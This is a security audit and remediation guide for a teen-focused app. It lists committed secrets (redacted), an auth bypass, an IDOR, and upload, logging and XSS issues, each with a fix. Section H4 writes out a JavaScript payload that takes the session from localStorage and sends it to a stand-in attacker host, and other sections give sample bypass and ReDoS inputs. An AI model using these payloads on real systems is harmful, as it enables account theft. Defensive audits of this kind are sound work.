# DUS App - Security & Structural Remediation Guide

> Generated 2026-02-10 | Comprehensive audit of the DUS codebase
> Covers security vulnerabilities, structural issues, and launch blockers

---

## Table of Contents

1. [CRITICAL Issues (Must Fix Before Launch)](#critical-issues)
   - [C1: Secrets Committed to Git History](#c1-secrets-committed-to-git-history)
   - [C2: Demo Auth Bypass Enabled by Default](#c2-demo-auth-bypass-enabled-by-default)
   - [C3: No Rate Limiting on Sensitive Endpoints](#c3-no-rate-limiting-on-sensitive-endpoints)
   - [C4: Parent Portal Data Leak / IDOR](#c4-parent-portal-data-leak--idor)
   - [C5: Sensitive Info Logged to Console](#c5-sensitive-info-logged-to-console)
2. [HIGH Issues (Should Fix Before Launch)](#high-issues)
   - [H1: Search Input Not Sanitized](#h1-search-input-not-sanitized)
   - [H2: User Emails Exposed in API Responses](#h2-user-emails-exposed-in-api-responses)
   - [H3: File Upload Has No Size or Type Validation](#h3-file-upload-has-no-size-or-type-validation)
   - [H4: JWT / Session Tokens Stored in localStorage](#h4-jwt--session-tokens-stored-in-localstorage)
   - [H5: Weak Default Secrets in .env](#h5-weak-default-secrets-in-env)
3. [MEDIUM Issues (Should Address)](#medium-issues)
   - [M1: No Input Sanitization on Posts/Comments](#m1-no-input-sanitization-on-postscomments)
   - [M2: No HTTPS Enforcement](#m2-no-https-enforcement)
   - [M3: 50 MB AWSCLIV2.pkg Binary in Repo](#m3-50-mb-awscliv2pkg-binary-in-repo)
   - [M4: Error Message Information Leakage](#m4-error-message-information-leakage)
   - [M5: Documentation Bloat](#m5-documentation-bloat)
4. [RESOLVED Issues (Already Fixed)](#resolved-issues)
5. [Priority Action Plan](#priority-action-plan)

---

## CRITICAL Issues

### C1: Secrets Committed to Git History

**Severity:** CRITICAL | **CWE:** CWE-798, CWE-540 | **CVSS:** 9.8

#### What's Wrong

Both `.env` files contain real production secrets and have been committed to git across 15+ commits. Even though `.gitignore` now excludes `.env`, the secrets remain permanently in git history.

#### Exposed Secrets Inventory

**Current `server/.env` (on disk):**

| Line | Secret Type | Value (truncated) | Service |
|------|-------------|-------------------|---------|
| 5 | Database URL | `[REDACTED_SUPABASE_DATABASE_URL]` | Supabase Postgres |
| 7 | Direct DB URL | Same password as above | Supabase Postgres (direct) |
| 11 | Service Role Key | `[REDACTED_SUPABASE_SERVICE_ROLE_KEY]` | Supabase Admin API (bypasses RLS) |
| 17 | System API Key | `dev-system-api-key-change-in-prod` | Internal system endpoints |
| 18 | Encryption Key | `dev-token-encryption-key-change-in-prod` | Token encryption |

**In git history (commit `0798a5f` and earlier):**

| Secret Type | Value (truncated) | Service |
|-------------|-------------------|---------|
| MongoDB URI | `[REDACTED_MONGODB_URI]` | MongoDB Atlas |
| JWT Secret | `[REDACTED_JWT_SECRET]` | JWT signing |
| Token Encryption Key | `[REDACTED_TOKEN_ENCRYPTION_KEY]` | Token encryption |
| AWS Access Key ID | `[REDACTED_AWS_ACCESS_KEY_ID]` | AWS IAM |
| AWS Secret Access Key | `[REDACTED_AWS_SECRET_ACCESS_KEY]` | AWS IAM |
| OpenAI API Key | `[REDACTED_OPENAI_API_KEY]` | OpenAI billing |
| Twitter Client Secret | `[REDACTED_TWITTER_CLIENT_SECRET]` | Twitter/X OAuth |

#### Why It's Dangerous

Anyone who clones or forks this repo can extract every secret using `git log -p`. This gives:
- Full read/write access to the production database
- Ability to forge JWT tokens for any user
- Full AWS access (S3, SES, compute -- plus billing)
- Supabase admin access that bypasses all Row Level Security
- Ability to run up the OpenAI bill

#### How to Fix

**Step 1 - Rotate ALL secrets immediately (do this FIRST):**

| Secret | Where to Rotate |
|--------|----------------|
| Supabase DB password | Supabase Dashboard > Settings > Database > Reset password |
| Supabase service role key | Supabase Dashboard > Settings > API > Regenerate |
| MongoDB password | Atlas Console > Database Access > Change password for `mhakim` |
| AWS keys | AWS Console > IAM > Users > Security credentials > Deactivate old > Create new |
| JWT Secret | Generate new: `openssl rand -base64 64` |
| Token Encryption Key | Generate new: `openssl rand -hex 32` |
| OpenAI API key | platform.openai.com > API keys > Delete old > Create new |
| Twitter OAuth secret | Twitter Developer Portal > Regenerate |

**Step 2 - Remove secrets from git history:**

```bash
# Option A: BFG Repo-Cleaner (recommended, faster)
brew install bfg
bfg --delete-files '.env' --no-blob-protection
git reflog expire --expire=now --all
git gc --prune=now --aggressive
git push --force --all

# Option B: git filter-repo
pip install git-filter-repo
git filter-repo --path .env --invert-paths
git filter-repo --path server/.env --invert-paths
git push --force --all
```

**Step 3 - Verify `.gitignore` covers both files:**

File: `/.gitignore` -- ensure this line exists:
```
.env
```

File: `/server/.gitignore` -- already has `.env` on line 48 (confirmed).

**Step 4 - Create `.env.example` files with placeholder values (no secrets).**

---

### C2: Demo Auth Bypass Enabled by Default

**Severity:** CRITICAL | **CWE:** CWE-287, CWE-306 | **CVSS:** 9.1

#### What's Wrong

The demo authentication bypass defaults to ENABLED because `NODE_ENV` defaults to `'development'` in the Zod config schema.

#### Affected Files

**File:** `server/src/config/env.ts` line 7
```typescript
NODE_ENV: z.enum(['development', 'production', 'test']).default('development'),
```

**File:** `server/src/middleware/auth.ts` lines 25-29
```typescript
// Demo token only in development
if (env.NODE_ENV === 'development' && token === 'demo-token') {
  req.user = { id: 'demo-user', role: 'teen', authId: 'demo-auth-id' };
  return next();
}
```

**File:** `server/src/routes/auth.ts` lines 17-20
```typescript
// POST /api/auth/demo - Dev-only demo auth
if (env.NODE_ENV === 'development') {
  router.post('/demo', authController.demoAuth);
}
```

**File:** `.env` line 11
```
VITE_DEMO_MODE=true
```

#### The Attack

If `NODE_ENV` is not explicitly set to `production` in the deployment environment (Render, Heroku, AWS), the Zod schema defaults it to `development`. This means:

1. Anyone sends `Authorization: Bearer demo-token`
2. Auth middleware matches: `env.NODE_ENV === 'development'` is `true`, `token === 'demo-token'` is `true`
3. Attacker is authenticated as `{ id: 'demo-user', role: 'teen' }` with zero credentials
4. Attacker can access all teen endpoints: goals, posts, threads, reminders, achievements, uploads

#### How to Fix

**Fix 1 - Remove the default from the Zod schema** (force explicit `NODE_ENV`):

File: `server/src/config/env.ts` line 7
```typescript
// BEFORE (dangerous - defaults to development)
NODE_ENV: z.enum(['development', 'production', 'test']).default('development'),

// AFTER (fails startup if NODE_ENV not set)
NODE_ENV: z.enum(['development', 'production', 'test']),
```

**Fix 2 - Add startup guard in `server/src/index.ts`:**

```typescript
if (env.NODE_ENV === 'development') {
  console.warn('WARNING: Running in DEVELOPMENT mode. Demo auth is ENABLED.');
}
```

**Fix 3 - Use an explicit env var instead of relying on NODE_ENV:**

File: `server/src/middleware/auth.ts` lines 25-29
```typescript
// BEFORE
if (env.NODE_ENV === 'development' && token === 'demo-token') {

// AFTER (requires ENABLE_DEMO_AUTH=true explicitly)
if (process.env.ENABLE_DEMO_AUTH === 'true' && token === 'demo-token') {
```

**Fix 4 - Remove `VITE_DEMO_MODE=true` from the committed `.env`** or set it to `false`.

**Fix 5 - Verify production deployment sets `NODE_ENV=production`** in Render/Heroku/AWS environment variables.

---

### C3: No Rate Limiting on Sensitive Endpoints

**Severity:** CRITICAL | **CWE:** CWE-770, CWE-307 | **CVSS:** 7.5

#### What's Wrong

While a basic general rate limiter exists (100 req/15 min), 12 route groups handling sensitive operations have no route-specific limits.

#### Affected Files

**File:** `server/src/middleware/rate-limiter.ts` (current state)
```typescript
export const generalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,                     // <-- too permissive for sensitive routes
  standardHeaders: true,
  legacyHeaders: false,
});

export const authLimiter = rateLimit({       // applied to /api/auth/*
  windowMs: 15 * 60 * 1000,
  max: 10,
});

export const aiLimiter = rateLimit({         // applied to /api/ai/*
  windowMs: 60 * 1000,
  max: 5,
});
```

**File:** `server/src/index.ts` line 22
```typescript
app.use(generalLimiter);   // global only -- no per-route limiters
```

#### Routes Missing Specific Rate Limits

| Route File | Path | Risk Without Limit |
|-----------|------|-------------------|
| `server/src/routes/uploads.ts` | `/api/uploads/presign` | S3 cost abuse, storage exhaustion |
| `server/src/routes/posts.ts` | `/api/posts` | Social spam/flooding |
| `server/src/routes/threads.ts` | `/api/threads` | Message spam, harassment |
| `server/src/routes/parentPortal.ts` | `/api/parent-portal/*` | Teen data enumeration |
| `server/src/routes/users.ts` | `/api/users` | User enumeration |
| `server/src/routes/goals.ts` | `/api/goals` | Data manipulation at scale |
| `server/src/routes/cron.ts` | `/api/cron/*` | Trigger expensive background jobs |
| `server/src/routes/reminders.ts` | `/api/reminders` | Resource exhaustion |
| `server/src/routes/achievements.ts` | `/api/achievements` | Data scraping |
| `server/src/routes/onboarding.ts` | `/api/onboarding` | Account creation abuse |
| `server/src/routes/settings.ts` | `/api/settings` | Account takeover prep |
| `server/src/routes/metrics.ts` | `/api/metrics` | Information disclosure |

#### Additional Problem: In-Memory Store

The `generalLimiter` uses the default in-memory store, which means:
- Rate limit state is lost on server restart
- Each server instance in a scaled deployment has its own counter
- Attackers can bypass limits by timing restarts

#### How to Fix

**Step 1 - Add route-specific limiters to `server/src/middleware/rate-limiter.ts`:**

```typescript
export const uploadLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 10,
  message: { error: 'Too many upload requests' },
});

export const messagingLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 20,
  message: { error: 'Too many messages' },
});

export const cronLimiter = rateLimit({
  windowMs: 60 * 1000,
  max: 1,
  message: { error: 'Too many cron requests' },
});

export const parentPortalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 30,
  message: { error: 'Too many requests' },
});
```

**Step 2 - Apply limiters in `server/src/routes/index.ts`:**

```typescript
import { uploadLimiter, messagingLimiter, cronLimiter, parentPortalLimiter } from '../middleware/rate-limiter';

apiRouter.use('/uploads', uploadLimiter, uploadsRoutes);
apiRouter.use('/threads', messagingLimiter, threadsRoutes);
apiRouter.use('/cron', cronLimiter, cronRoutes);
apiRouter.use('/parent-portal', parentPortalLimiter, parentPortalRoutes);
```

**Step 3 - (For production) Switch to Redis-backed store:**

```bash
npm install rate-limit-redis redis
```

```typescript
import RedisStore from 'rate-limit-redis';
import { createClient } from 'redis';

const redisClient = createClient({ url: process.env.REDIS_URL });

export const generalLimiter = rateLimit({
  store: new RedisStore({
    sendCommand: (...args: string[]) => redisClient.sendCommand(args),
  }),
  windowMs: 15 * 60 * 1000,
  max: 60,    // tighten from 100 to 60
});
```

---

### C4: Parent Portal Data Leak / IDOR

**Severity:** CRITICAL | **CWE:** CWE-862, CWE-639 | **CVSS:** 8.1

#### What's Wrong

Two related issues in the parent portal:

**Issue A (Legacy code path):** The `loadLinkedTeens` function falls back to returning ALL teens when no relationship service is configured.

**Issue B (Current code):** The `submitFeedback` endpoint does not verify the parent-child relationship -- any parent can submit feedback on any child's goal.

#### Affected Files - Issue A

**File:** `server/src/routes/parentPortal.ts` lines 9-36 (legacy Mongoose code path)
```typescript
async function loadLinkedTeens(parentId?: string) {
  // ... tries relationship service ...

  // DANGEROUS FALLBACK:
  if (!teens || teens.length === 0) {
    teens = (await User.find({ role: 'teen' }).lean()) as any[];  // ALL TEENS!
  }

  return teens;
}
```

#### Affected Files - Issue B

**File:** `server/src/controllers/parent-portal.controller.ts` lines 124-141
```typescript
export async function submitFeedback(req: Request, res: Response, next: NextFunction) {
  try {
    if (!req.user) return res.status(401).json({ error: 'Unauthorized' });
    const { childId, goalId } = req.params;
    // childId comes directly from URL -- NEVER verified against parent's linked children
    const result = await parentPortalService.submitFeedback(
      childId,       // <-- user-controlled, unvalidated
      goalId,
      req.body,
    );
    return res.json({ success: true, feedback: result });
  } catch (err) {
    next(err);
  }
}
```

**File:** `server/src/services/parent-portal.service.ts` lines 115-130
```typescript
export async function submitFeedback(
  childId: string,      // <-- no parentId param, no relationship check
  goalId: string,
  data: { feedback?: string; suggestedMilestones?: string[]; encouragement?: string },
) {
  return aiGoalFeedbackRepo.upsertFeedback(goalId, childId, {
    parentReviewed: true,
    parentReviewedAt: new Date(),
    parentFeedback: data.feedback,
    parentSuggestedMilestones: data.suggestedMilestones || [],
  });
}
```

#### The Attack

**Issue A:** Any parent account sees ALL teens' goals, progress, and data in the parent portal.

**Issue B:** `POST /api/parent-portal/children/:childId/goals/:goalId/feedback` -- an attacker with a parent account can:
1. Guess or enumerate `childId` values
2. Submit feedback on any child's goal
3. Mark goals as "parent reviewed" for children they don't own

This is an IDOR (Insecure Direct Object Reference) vulnerability.

#### How to Fix

**Fix for Issue A** -- in `server/src/routes/parentPortal.ts` line 31-33:
```typescript
// BEFORE (shows ALL teens)
if (!teens || teens.length === 0) {
  teens = (await User.find({ role: 'teen' }).lean()) as any[];
}

// AFTER (return empty array)
if (!teens || teens.length === 0) {
  return [];  // No linked children found -- return empty, don't show everyone
}
```

**Fix for Issue B** -- in `server/src/services/parent-portal.service.ts`:
```typescript
export async function submitFeedback(
  parentId: string,     // ADD: pass the authenticated parent's ID
  childId: string,
  goalId: string,
  data: { ... },
) {
  // VERIFY the parent-child relationship first
  const linkedTeens = await loadLinkedTeens(parentId);
  const isLinked = linkedTeens.some((t) => t.id === childId);
  if (!isLinked) {
    throw new AppError(403, 'Not authorized to provide feedback for this child');
  }

  return aiGoalFeedbackRepo.upsertFeedback(goalId, childId, { ... });
}
```

Update the controller in `server/src/controllers/parent-portal.controller.ts`:
```typescript
const result = await parentPortalService.submitFeedback(
  req.user.id,       // ADD: pass authenticated user's ID
  childId,
  goalId,
  req.body,
);
```

---

### C5: Sensitive Info Logged to Console

**Severity:** HIGH (CRITICAL when combined with C1) | **CWE:** CWE-532

#### What's Wrong

Multiple locations log sensitive data to console output, which persists in hosting platform logs (Render, CloudWatch, etc.).

#### Affected Files

**File:** `server/src/db.ts` line 24 (legacy code path)
```typescript
console.log('Final MONGODB_URI:', MONGODB_URI);  // Logs full connection string with password!
```

**File:** `server/src/config/env.ts` line 29
```typescript
if (!parsed.success) {
  console.error('Invalid environment variables:', parsed.error.flatten().fieldErrors);
  // Could log partial secret values if validation fails
  process.exit(1);
}
```

**File:** `server/src/middleware/error-handler.ts` line 12
```typescript
console.error('Unhandled error:', err);
// Prisma errors can contain connection strings
```

#### How to Fix

**Fix 1** -- Remove the MongoDB URI log in `server/src/db.ts` line 24:
```typescript
// DELETE this line entirely:
console.log('Final MONGODB_URI:', MONGODB_URI);
```

**Fix 2** -- Sanitize env validation errors in `server/src/config/env.ts` line 29:
```typescript
// BEFORE
console.error('Invalid environment variables:', parsed.error.flatten().fieldErrors);

// AFTER (only log field names, not values)
const missingFields = Object.keys(parsed.error.flatten().fieldErrors);
console.error('Missing or invalid environment variables:', missingFields.join(', '));
```

**Fix 3** -- Sanitize error handler in `server/src/middleware/error-handler.ts` line 12:
```typescript
// BEFORE
console.error('Unhandled error:', err);

// AFTER
console.error('Unhandled error:', err.message);
// For development debugging, conditionally log stack:
if (env.NODE_ENV === 'development') {
  console.error(err.stack);
}
```

---

## HIGH Issues

### H1: Search Input Not Sanitized

**Severity:** HIGH | **CWE:** CWE-943

#### What's Wrong

User search queries are passed directly into database queries without escaping special characters.

#### Affected Files

**Legacy code path** -- `server/src/routes/users.ts` lines 16-19 (Mongoose `$regex`)
```typescript
query.$or = [
  { displayName: { $regex: search, $options: 'i' } },  // Raw user input in $regex!
  { email: { $regex: search, $options: 'i' } },
  { cohortCode: { $regex: search, $options: 'i' } }
];
```

**Current code path** -- `server/src/repositories/user.repo.ts` lines 16-39 (Prisma `contains`)
```typescript
return prisma.user.findMany({
  where: query
    ? {
        OR: [
          { display_name: { contains: query, mode: 'insensitive' } },
          { cohort_code: { contains: query, mode: 'insensitive' } },
        ],
      }
    : undefined,    // Empty query returns ALL users
});
```

#### The Attacks

**Mongoose path:** A malicious `$regex` pattern like `.*` or `(a+)+$` causes ReDoS (Regular Expression Denial of Service), hanging the database.

**Prisma path:** Submitting `q=%` matches ALL users (SQL LIKE wildcard). Submitting `q=___` matches users with exactly 3-character names (enumeration). An empty `q` returns ALL users.

#### How to Fix

**Fix 1 - Escape LIKE wildcards** in `server/src/repositories/user.repo.ts`:
```typescript
function escapeLikeQuery(input: string): string {
  return input.replace(/[%_\\]/g, '\\$&');
}

export function search(query: string, limit: number = 50) {
  const safeLimit = Math.max(1, Math.min(limit, 200));
  const safeQuery = query ? escapeLikeQuery(query) : '';

  return prisma.user.findMany({
    where: safeQuery.length >= 2   // Require minimum 2 chars
      ? {
          OR: [
            { display_name: { contains: safeQuery, mode: 'insensitive' } },
            { cohort_code: { contains: safeQuery, mode: 'insensitive' } },
          ],
        }
      : undefined,
    take: safeLimit,
  });
}
```

**Fix 2 - Escape regex** in `server/src/routes/users.ts` (legacy path):
```typescript
function escapeRegex(str: string): string {
  return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

const safeSearch = escapeRegex(search);
query.$or = [
  { displayName: { $regex: safeSearch, $options: 'i' } },
  // ...
];
```

**Fix 3 - Enforce minimum query length** in the controller.

---

### H2: User Emails Exposed in API Responses

**Severity:** HIGH | **CWE:** CWE-359

#### What's Wrong

User emails are returned in public-facing API responses visible to all authenticated users.

#### Affected Files

**File:** `server/src/routes/posts.ts` lines 50-55 (legacy)
```typescript
userMap = users.map((user) => [String(user._id), {
  id: String(user._id),
  displayName: user.displayName || user.email,
  avatarUrl: user.avatarUrl,
  email: user.email     // <-- EXPOSED to all users viewing posts
}]);
```

**File:** `server/src/routes/users.ts` lines 37-47 (legacy)
```typescript
const safeUsers = users.map((u) => ({
  id: String(u._id),
  displayName: u.displayName || u.email,
  email: u.email,       // <-- EXPOSED in user directory
  // ...
}));
```

**File:** `server/src/routes/auth.ts` line 65 (legacy)
```typescript
return res.json({ token, user: { id: user._id, email: user.email, ... } });
// email in login response is OK (user's own data)
```

**File:** `src/types/api.ts` lines 12-17 (frontend type)
```typescript
export type ApiUserSummary = {
  id: string;
  displayName?: string;
  email?: string;        // <-- Should NOT be in public-facing type
  avatarUrl?: string;
};
```

#### Why It Matters for This App

This app targets **teenagers**. Exposing email addresses of minors to all authenticated users is a privacy violation and potentially a legal issue under COPPA and GDPR (children's data protections).

#### How to Fix

**Fix 1** -- Remove `email` from post author responses in `server/src/routes/posts.ts`:
```typescript
// Remove email from the userMap entries
{
  id: String(user._id),
  displayName: user.displayName || 'User',  // Don't fall back to email
  avatarUrl: user.avatarUrl,
  // NO email field
}
```

**Fix 2** -- Remove `email` from user directory in `server/src/routes/users.ts`:
```typescript
const safeUsers = users.map((u) => ({
  id: String(u._id),
  displayName: u.displayName || 'User',
  handle: u.displayName ? `@${(u.displayName).toLowerCase().replace(/\s+/g, '')}` : '@user',
  avatarUrl: u.avatarUrl || '',
  role: u.role,
  // NO email field
}));
```

**Fix 3** -- Remove `email?` from `ApiUserSummary` type in `src/types/api.ts`.

**Fix 4** -- Add explicit `select` to Prisma queries to never accidentally fetch email for public responses.

---

### H3: File Upload Has No Size or Type Validation

**Severity:** HIGH | **CWE:** CWE-434

#### What's Wrong

The file upload system accepts files of any type and any size.

#### Affected Files

**Legacy path** -- `server/src/routes/posts.ts` lines 15-23
```typescript
const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, uploadDir),
  filename: (_req, file, cb) => {
    const ext = path.extname(file.originalname);
    const base = path.basename(file.originalname, ext).replace(/[^a-z0-9-_]/gi, '_');
    cb(null, `${Date.now()}_${base}${ext}`);
  }
});
const upload = multer({ storage });  // NO limits, NO fileFilter!
```

**Current path** -- `server/src/controllers/upload.controller.ts` lines 1-18
```typescript
export async function presign(req: Request, res: Response, next: NextFunction) {
  try {
    const { filename } = req.body || {};
    if (!filename) return res.status(400).json({ error: 'filename required' });
    // NO file type validation on filename!
    // NO size limit on presigned URL!
    const result = await uploadService.createSignedUploadUrl(filename);
    return res.json(result);
  } catch (err) {
    next(err);
  }
}
```

#### The Attacks

1. Upload arbitrarily large files (disk exhaustion / S3 cost abuse)
2. Upload `.html` or `.svg` files containing JavaScript (stored XSS)
3. Upload executables (`.exe`, `.sh`, `.bat`)
4. Upload 100+ presigned URLs within the rate limit window

#### How to Fix

**Fix for legacy multer** -- `server/src/routes/posts.ts`:
```typescript
const ALLOWED_MIMES = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'video/mp4', 'video/quicktime'];
const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB

const upload = multer({
  storage,
  limits: { fileSize: MAX_FILE_SIZE },
  fileFilter: (_req, file, cb) => {
    if (ALLOWED_MIMES.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error(`File type ${file.mimetype} not allowed`));
    }
  },
});
```

**Fix for presigned upload** -- `server/src/controllers/upload.controller.ts`:
```typescript
const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.mov'];
const MAX_FILENAME_LENGTH = 255;

export async function presign(req: Request, res: Response, next: NextFunction) {
  const { filename } = req.body || {};
  if (!filename || typeof filename !== 'string') {
    return res.status(400).json({ error: 'filename required' });
  }
  if (filename.length > MAX_FILENAME_LENGTH) {
    return res.status(400).json({ error: 'filename too long' });
  }
  const ext = filename.slice(filename.lastIndexOf('.')).toLowerCase();
  if (!ALLOWED_EXTENSIONS.includes(ext)) {
    return res.status(400).json({ error: `File type ${ext} not allowed` });
  }
  // ... proceed with presign
}
```

---

### H4: JWT / Session Tokens Stored in localStorage

**Severity:** HIGH | **CWE:** CWE-922

#### What's Wrong

Authentication tokens are stored in `localStorage`, which is accessible to any JavaScript on the page. If an XSS vulnerability exists anywhere in the app, the attacker can steal the user's session.

#### Affected Files

**File:** `src/integrations/supabase/client.ts` lines 11-17
```typescript
export const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
  auth: {
    storage: localStorage,     // <-- XSS-accessible!
    persistSession: true,
    autoRefreshToken: true,
  }
});
```

**File:** `src/contexts/AuthContext.tsx` line 49 (legacy)
```typescript
localStorage.setItem('dus_token', 'demo-token');
```

**File:** `src/api/client.ts` lines 15-22 (current)
```typescript
const { data: { session } } = await supabase.auth.getSession();
if (session?.access_token) {
  headers.Authorization = `Bearer ${session.access_token}`;
}
```

#### The Attack

```javascript
// XSS payload that steals the session:
const keys = Object.keys(localStorage);
const supaKey = keys.find(k => k.includes('supabase'));
const session = JSON.parse(localStorage.getItem(supaKey));
fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(session) });
```

The stolen refresh token can generate new access tokens indefinitely until revoked.

#### How to Fix

**Option A (recommended but complex)** -- Use in-memory storage:
```typescript
export const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
  auth: {
    storage: {
      getItem: () => null,
      setItem: () => {},
      removeItem: () => {},
    },
    persistSession: false,     // Keep in memory only
    autoRefreshToken: true,
  }
});
```
Note: This means users must re-login on page refresh.

**Option B (simpler, reduced risk)** -- Use `sessionStorage` instead:
```typescript
export const supabase = createClient<Database>(SUPABASE_URL, SUPABASE_PUBLISHABLE_KEY, {
  auth: {
    storage: sessionStorage,   // Cleared when tab closes
    persistSession: true,
    autoRefreshToken: true,
  }
});
```

**Option C (defense in depth)** -- Add CSP headers to mitigate XSS:
```typescript
// In server/src/index.ts, configure helmet with CSP:
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "https://*.supabase.co"],
      connectSrc: ["'self'", SUPABASE_URL],
    },
  },
}));
```

---

### H5: Weak Default Secrets in .env

**Severity:** HIGH | **CWE:** CWE-798

#### What's Wrong

The `.env` file contains placeholder secrets that are trivially guessable.

#### Affected Files

**File:** `server/.env` lines 17-18
```
SYSTEM_API_KEY=dev-system-api-key-change-in-prod
TOKEN_ENCRYPTION_KEY=dev-token-encryption-key-change-in-prod
```

**File:** `server/src/config/env.ts` lines 13-14
```typescript
SYSTEM_API_KEY: z.string().optional(),        // No minimum length!
TOKEN_ENCRYPTION_KEY: z.string().optional(),  // No minimum length!
```

#### How to Fix

**Fix 1** -- Add minimum strength requirements in `server/src/config/env.ts`:
```typescript
SYSTEM_API_KEY: z.string().min(32, 'SYSTEM_API_KEY must be at least 32 characters'),
TOKEN_ENCRYPTION_KEY: z.string().min(32, 'TOKEN_ENCRYPTION_KEY must be at least 32 characters'),
```

**Fix 2** -- Reject known-weak defaults on production startup:
```typescript
const WEAK_SECRETS = ['dev-system-api-key-change-in-prod', 'dev-token-encryption-key-change-in-prod'];
if (parsed.data.NODE_ENV === 'production') {
  if (WEAK_SECRETS.includes(parsed.data.SYSTEM_API_KEY || '')) {
    console.error('FATAL: SYSTEM_API_KEY has a known weak default');
    process.exit(1);
  }
}
```

**Fix 3** -- Generate strong replacements:
```bash
openssl rand -hex 32   # for SYSTEM_API_KEY
openssl rand -hex 32   # for TOKEN_ENCRYPTION_KEY
```

---

## MEDIUM Issues

### M1: No Input Sanitization on Posts/Comments

**Severity:** Medium-High | **CWE:** CWE-79

#### What's Wrong

Post content and comments are validated for length only, not sanitized for malicious content.

#### Affected Files

**File:** `server/src/routes/posts.ts` lines 25-30
```typescript
const createPostSchema = z.object({
  content: z.string().min(1).max(1000),      // No HTML stripping
  mediaType: z.string().optional(),           // No enum constraint
  mediaUrl: z.string().max(2000).optional(),  // No URL validation
  visibility: z.string().optional()            // No enum constraint
});
```

**File (frontend rendering):** `src/pages/PostDetailPage.tsx` lines 136, 147
```tsx
<img src={post.mediaUrl} alt={post.content} />   // mediaUrl could be javascript: URI
<video ref={videoRef} src={post.mediaUrl} />
```

#### Mitigating Factor

React's JSX auto-escapes `{variable}` expressions, so `<script>` tags in post content render as text. However, `mediaUrl` flows into `src` attributes which can accept `javascript:` URIs.

#### How to Fix

**Fix 1** -- Tighten Zod schemas:
```typescript
const createPostSchema = z.object({
  content: z.string().min(1).max(1000),
  mediaType: z.enum(['image', 'video']).optional(),
  mediaUrl: z.string().url().max(2000)
    .refine(url => url.startsWith('https://'), 'Only HTTPS URLs allowed')
    .optional(),
  visibility: z.enum(['public', 'friends', 'private']).optional()
});
```

**Fix 2** -- Strip HTML from content server-side:
```bash
npm install sanitize-html
```
```typescript
import sanitize from 'sanitize-html';
const cleanContent = sanitize(parse.data.content, { allowedTags: [], allowedAttributes: {} });
```

---

### M2: No HTTPS Enforcement

**Severity:** Medium | **CWE:** CWE-319

#### What's Wrong

No middleware redirects HTTP to HTTPS. While hosting platforms (Render) handle TLS termination, the app doesn't enforce it.

#### Affected File

`server/src/index.ts` -- no HTTPS redirect logic exists.

#### How to Fix

Add before other middleware in `server/src/index.ts`:
```typescript
if (env.NODE_ENV === 'production') {
  app.use((req, res, next) => {
    if (req.headers['x-forwarded-proto'] !== 'https') {
      return res.redirect(301, `https://${req.headers.host}${req.url}`);
    }
    next();
  });
}
```

---

### M3: 50 MB AWSCLIV2.pkg Binary in Repo

**Severity:** Medium

#### What's Wrong

**File:** `server/AWSCLIV2.pkg` -- a 50 MB macOS installer binary is committed to the repository.

#### How to Fix

```bash
# Add to .gitignore
echo "*.pkg" >> server/.gitignore

# Remove from git
git rm server/AWSCLIV2.pkg

# To remove from history (saves 50 MB for every clone):
bfg --delete-files 'AWSCLIV2.pkg'
git reflog expire --expire=now --all && git gc --prune=now --aggressive
```

---

### M4: Error Message Information Leakage

**Severity:** Medium | **CWE:** CWE-209

#### What's Wrong

`AppError` messages are sent directly to clients. If a developer writes an error with internal details, it leaks.

#### Affected File

`server/src/middleware/error-handler.ts`
```typescript
if (err instanceof AppError) {
  return res.status(err.statusCode).json({
    error: err.message,    // <-- sent verbatim to client
    code: err.code,
  });
}
```

#### How to Fix

```typescript
if (err instanceof AppError) {
  return res.status(err.statusCode).json({
    error: err.message,
    code: err.code,
    ...(env.NODE_ENV === 'development' ? { stack: err.stack } : {}),
  });
}
// For non-AppError, never leak details:
console.error('Unhandled error:', err.message);
return res.status(500).json({ error: 'Internal server error' });
```

---

### M5: Documentation Bloat

**Severity:** Low

#### Root-Level Markdown Files to Clean Up

| File | Lines | Recommendation |
|------|-------|---------------|
| `README.md` | ~50 | KEEP |
| `PROJECT_STATUS_SUMMARY.md` | 437 | DELETE (AI-generated artifact) |
| `REMINDER_SECURITY_SUMMARY.md` | 365 | DELETE (AI-generated artifact) |
| `SYSTEM_ARCHITECTURE.md` | 720 | DELETE (outdated, references old patterns) |
| `SECURITY_AUDIT.md` | 536 | DELETE (outdated, references bcrypt/MongoDB) |
| `AI_DEVELOPMENT_FALLBACK.md` | ~100 | DELETE |
| `AI_INTEGRATION_FIX.md` | ~100 | DELETE |
| `API_TESTING_GUIDE.md` | ~100 | DELETE |
| `BROWSER_AGENT_TEST_PROMPT.md` | ~100 | DELETE |
| `COMPLETION_REPORT_REMINDERS_SECURITY.md` | ~100 | DELETE |
| `COMPLETION_SUMMARY.txt` | ~100 | DELETE |
| `FEEDBACK_LOOP.md` | ~100 | DELETE |
| `FEEDBACK_LOOP_INTEGRATION_SUMMARY.md` | ~100 | DELETE |
| `GOAL_SOURCE_TRACKING.md` | ~100 | DELETE |
| `IMPLEMENTATION_STATUS.md` | ~100 | DELETE |
| `INTEGRATION_CHECKLIST.md` | ~100 | DELETE |
| `MILESTONE_WEBHOOK.md` | ~100 | DELETE |

Also delete `server/AWS_DEPLOYMENT_GUIDE.md` and `server/AWS_DEPLOYMENT_README.md` (consolidate into `server/DEPLOY.md`).

---

## RESOLVED Issues

These were flagged in the original scan but have been fixed:

| Issue | Status | Evidence |
|-------|--------|----------|
| `x-dus-user-id` header spoofing | Fixed | Auth now uses Supabase JWT verification only |
| CORS wildcard `*.netlify.app` | Fixed | Uses single `FRONTEND_ORIGIN` string |
